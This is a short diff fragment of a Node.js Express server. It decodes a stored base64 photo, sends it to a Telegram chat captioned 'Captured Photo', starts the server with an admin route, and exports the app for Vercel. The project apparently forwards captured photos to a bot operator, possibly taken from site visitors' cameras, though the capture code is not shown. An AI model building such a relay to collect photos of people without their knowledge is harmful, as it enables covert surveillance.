+            const base64Data = latest.photo.replace(/^data:image\/jpeg;base64,/, "");
+            const buffer = Buffer.from(base64Data, 'base64');
+            bot.sendPhoto(msg.chat.id, buffer, { caption: '📸 Captured Photo' });
+        } catch (e) {}
+    }
+});
+
+// Start Server
+app.listen(PORT, () => {
+    console.log(`🚀 Server running on port ${PORT}`);
+    console.log(`📱 Telegram bot initialized`);
+    console.log(`🌐 Access: http://localhost:${PORT}`);
+    console.log(`🔧 Admin: http://localhost:${PORT}/admin`);
+});
+
+// Export for Vercel
+module.exports = app;
